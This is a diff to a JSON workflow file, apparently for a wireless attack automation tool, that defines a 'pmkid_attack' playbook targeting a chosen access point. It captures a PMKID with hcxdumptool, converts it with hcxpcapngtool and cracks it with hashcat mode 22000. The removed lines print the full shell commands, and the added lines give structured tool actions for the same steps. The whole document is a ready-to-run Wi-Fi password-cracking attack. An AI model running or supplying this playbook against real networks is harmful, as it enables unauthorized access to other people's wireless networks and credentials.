@@ -1,8 +1,8 @@
 {
   "name": "pmkid_attack",
-  "description": "PMKID clientless attack: capture PMKID from AP without any connected clients using hcxdumptool, then crack with hashcat.",
+  "description": "PMKID clientless attack: capture PMKID from AP without any connected clients using hcxdumptool, convert with hcxpcapngtool, then crack with hashcat.",
   "author": "james-linux",
-  "version": "1.0",
+  "version": "2.0",
   "requires_root": true,
   "steps": [
     {
@@ -18,28 +18,30 @@
     },
     {
       "id": "pmkid_capture",
-      "action": "layer.run",
+      "action": "hcxtools.capture_pmkid",
       "params": {
-        "command": "timeout 60 hcxdumptool -i {{monitor_interface}} -o /tmp/james_pmkid.pcapng --filterlist_ap={{target_bssid}} --filtermode=2 --enable_status=1",
-        "timeout": 75,
-        "sudo": true
+        "interface": "{{monitor_interface}}",
+        "output_pcapng": "/tmp/james_pmkid.pcapng",
+        "timeout": 60
       },
       "description": "Capture PMKID from target AP (60 second window)"
     },
     {
       "id": "convert_hash",
-      "action": "layer.run",
+      "action": "hcxtools.extract_hashes",
       "params": {
-        "command": "hcxpcapngtool -o /tmp/james_pmkid_hash.22000 /tmp/james_pmkid.pcapng",
-        "timeout": 15
+        "pcapng_file": "/tmp/james_pmkid.pcapng",
+        "output_hash_file": "/tmp/james_pmkid_hash.22000"
       },
       "description": "Convert pcapng capture to hashcat 22000 format"
     },
     {
       "id": "crack_pmkid",
-      "action": "layer.run",
+      "action": "hashcat.crack",
       "params": {
-        "command": "hashcat -m 22000 /tmp/james_pmkid_hash.22000 {{wordlist}} --force -o /tmp/james_pmkid_cracked.txt",
+        "hash_file": "/tmp/james_pmkid_hash.22000",
+        "wordlist": "{{wordlist}}",
+        "hash_mode": 22000,
         "timeout": 1800
       },
       "description": "Crack PMKID hash with hashcat (mode 22000)"
